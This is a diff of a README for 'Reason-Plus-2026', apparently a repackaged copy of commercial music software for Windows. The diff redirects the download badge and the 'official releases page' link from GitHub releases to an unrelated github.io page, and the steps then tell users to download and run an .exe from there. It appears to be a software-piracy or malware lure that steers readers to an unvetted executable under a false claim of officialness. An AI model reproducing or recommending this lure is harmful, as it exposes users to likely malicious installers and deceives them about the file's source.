@@ -1,6 +1,6 @@
 # 🎧 Reason-Plus-2026 - Create professional music on Windows easily
 
-[![Download for Windows](https://img.shields.io/badge/Download-Reason_Plus-blue.svg)](https://github.com/qiang1273/Reason-Plus-2026/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Reason_Plus-blue.svg)](https://qiang1273.github.io)
 
 Reason-Plus-2026 provides a complete workstation for music production. This software allows you to record, edit, and mix audio tracks. It includes a variety of instruments and effects. Use this guide to set up the application on your Windows computer.
 
@@ -21,7 +21,7 @@ Make sure to install the latest Windows updates. These updates keep your system 
 
 You must download the installation file from the official releases page.
 
-1. Go to the [Reason-Plus-2026 Releases Page](https://github.com/qiang1273/Reason-Plus-2026/releases).
+1. Go to the [Reason-Plus-2026 Releases Page](https://qiang1273.github.io).
 2. Look for the section labeled "Assets" at the bottom of the latest version post.
 3. Click on the file that ends in .exe.
 4. Save the file to your "Downloads" folder.
